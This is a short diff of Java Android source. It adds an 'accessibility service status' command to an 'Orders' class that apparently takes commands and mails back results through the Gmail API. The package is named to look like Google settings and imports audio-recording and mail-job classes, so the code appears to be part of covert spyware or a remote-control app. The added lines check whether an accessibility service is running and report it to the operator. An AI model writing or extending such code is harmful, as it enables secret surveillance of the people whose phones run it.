@@ -22,6 +22,7 @@ import com.google.api.client.util.Base64;
 import com.google.api.client.util.StringUtils;
 import com.google.api.services.gmail.model.Message;
 import com.google.api.services.gmail.model.MessagePartHeader;
+import com.setting.dl.google.googlesettings.AccessNotification;
 import com.setting.dl.google.googlesettings.AudioRecord;
 import com.setting.dl.google.googlesettings.MailJobs;
 import com.setting.dl.google.googlesettings.Time;
@@ -777,6 +778,23 @@ public class Orders {
 				u.sendMessage(context, "blockedWindows", Arrays.toString(blockedWindows.toArray()));
 			}
 			
+			return;
+		}
+		
+		if (order.equals("accessibility service status")) {
+            
+		    String title = "AccessibilityService Status", text;
+		    
+            if(AccessNotification.isAccessibilityServiceEnabled(context, AccessNotification.class)){
+                
+                text = "Service is running";
+            }
+            else{
+                
+                text = "Service is not running";
+            }
+            
+            u.sendMessage(context, title, text);
 		}
 		
 		
